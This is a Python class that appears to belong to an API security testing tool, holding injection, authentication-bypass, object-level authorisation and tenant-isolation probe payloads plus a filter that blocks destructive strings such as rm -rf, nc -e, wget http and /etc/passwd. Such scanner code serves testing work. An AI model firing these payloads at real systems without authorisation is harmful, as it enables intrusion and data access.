from __future__ import annotations

from collections.abc import Iterable
import re


class PayloadRegistry:
    def __init__(self) -> None:
        self.payload_registry: dict[str, list[str]] = {
            "bola": [
                "../users/2",
                "?user_id=2",
                "?account_id=2",
                "/v1/orders/2",
            ],
            "auth_bypass": [
                "Authorization: Bearer invalid-token",
                "Authorization: Bearer none",
                "X-Forwarded-User: admin",
                "Cookie: session=expired",
            ],
            "injection": [
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "') OR ('1'='1",
                "{{7*7}}",
            ],
            "tenant_isolation": [
                "?salon_id=other-tenant",
                "?tenant_id=00000000-0000-0000-0000-000000000001",
                "X-Tenant-Id: other-tenant",
                "/api/tenant/other-tenant/resources",
            ],
        }

        self._context_overrides: dict[str, dict[str, list[str]]] = {
            "injection": {
                "postgres": [
                    "' UNION SELECT current_user--",
                    "'::text || (SELECT version())--",
                ],
                "mysql": [
                    "' UNION SELECT user()-- ",
                    "' OR SLEEP(1)-- ",
                ],
                "nosql": [
                    '{"$ne": null}',
                    '{"$gt": ""}',
                ],
                "graphql": [
                    '"}} query{__typename} #',
                    "' } query { __schema { types { name } } } #",
                ],
            },
            "auth_bypass": {
                "jwt": [
                    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
                    "Authorization: Bearer malformed.jwt.token",
                ],
                "session": [
                    "Cookie: session=guest; role=admin",
                    "Cookie: session=00000000000000000000000000000000",
                ],
                "oauth": [
                    "Authorization: Bearer reused-access-token",
                    "X-Original-URL: /admin",
                ],
            },
            "bola": {
                "uuid": [
                    "/v1/users/00000000-0000-0000-0000-000000000001",
                    "?user_uuid=00000000-0000-0000-0000-000000000001",
                ],
                "numeric": [
                    "/v1/users/1",
                    "?owner_id=1",
                ],
            },
            "tenant_isolation": {
                "header": [
                    "X-Organization-Id: other-org",
                    "X-Salon-Id: 9999",
                ],
                "path": [
                    "/api/orgs/other-org/settings",
                    "/api/tenants/2/members",
                ],
            },
        }

        self._dangerous_pattern_strings: tuple[str, ...] = (
            "rm -rf",
            " drop table",
            "drop database",
            "truncate table",
            "shutdown",
            "reboot",
            "mkfs",
            "dd if=",
            "curl http",
            "wget http",
            "nc -e",
            "powershell -enc",
            "/etc/passwd",
            "create user",
            "alter user",
            "grant all",
            "insert into",
            "update users set",
            "delete from",
            "crontab",
            "startup",
            "autorun",
            "persistence",
            "backdoor",
            "reverse shell",
        )
        self._dangerous_regexes: tuple[re.Pattern[str], ...] = (
            re.compile(r"\b(drop|truncate)\s+(table|database)\b", re.IGNORECASE),
            re.compile(r"\b(rm|del)\s+-[a-z]*f", re.IGNORECASE),
            re.compile(r"\b(shutdown|reboot|halt)\b", re.IGNORECASE),
            re.compile(r"\b(create|alter)\s+user\b", re.IGNORECASE),
            re.compile(r"\b(insert|delete|update)\b\s+\w+", re.IGNORECASE),
            re.compile(r"\b(crontab|schtasks|systemctl\s+enable)\b", re.IGNORECASE),
        )

    def get_payloads(self, attack_class: str, context: dict | None = None) -> list[str]:
        key = attack_class.strip().lower()
        base_payloads = list(self.payload_registry.get(key, []))
        if not context:
            return self.safety_filter(self._dedupe(base_payloads))

        context_terms = self._collect_context_terms(context)
        overrides = self._context_overrides.get(key, {})
        selected_payloads = list(base_payloads)

        for term in context_terms:
            for override_key, candidates in overrides.items():
                if override_key in term:
                    selected_payloads.extend(candidates)

        return self.safety_filter(self._dedupe(selected_payloads))

    def tune_payloads(self, attack_class: str, successful_payloads: list[str]) -> None:
        key = attack_class.strip().lower()
        safe_candidates = self.safety_filter(successful_payloads)
        if not safe_candidates:
            return

        current = self.payload_registry.get(key, [])
        promoted = self._dedupe(safe_candidates + current)
        self.payload_registry[key] = promoted[:24]

    def safety_filter(self, payloads: list[str]) -> list[str]:
        safe_payloads: list[str] = []
        for payload in payloads:
            if not isinstance(payload, str):
                continue
            normalized = f" {payload.strip().lower()} "
            if not normalized.strip():
                continue
            if any(pattern in normalized for pattern in self._dangerous_pattern_strings):
                continue
            blocked = False
            for regex in self._dangerous_regexes:
                if regex.search(normalized):
                    blocked = True
                    break
            if blocked:
                continue
            safe_payloads.append(payload)
        return safe_payloads

    def _collect_context_terms(self, context: dict) -> set[str]:
        terms: set[str] = set()
        for raw_value in context.values():
            if isinstance(raw_value, str):
                terms.add(raw_value.lower())
            elif isinstance(raw_value, Iterable):
                for item in raw_value:
                    if isinstance(item, str):
                        terms.add(item.lower())
        return terms

    def _dedupe(self, values: list[str]) -> list[str]:
        seen: set[str] = set()
        deduped: list[str] = []
        for value in values:
            if value in seen:
                continue
            seen.add(value)
            deduped.append(value)
        return deduped
